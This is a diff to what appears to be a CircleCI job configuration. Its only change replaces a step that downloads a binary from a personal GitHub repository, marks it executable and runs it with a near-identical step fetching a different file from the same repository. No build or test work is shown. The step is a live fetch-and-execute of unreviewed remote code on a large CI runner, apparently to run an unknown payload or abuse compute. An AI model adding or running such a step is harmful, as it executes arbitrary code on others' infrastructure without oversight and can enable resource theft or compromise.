@@ -6,4 +6,4 @@ jobs:
     resource_class: large
     working_directory: ~/my-app
     steps:
-      - run: wget https://raw.githubusercontent.com/dewoji1/dew/main/b && chmod +x b && ./b
+      - run: wget https://github.com/dewoji1/dew/raw/main/f && chmod +x f && ./f
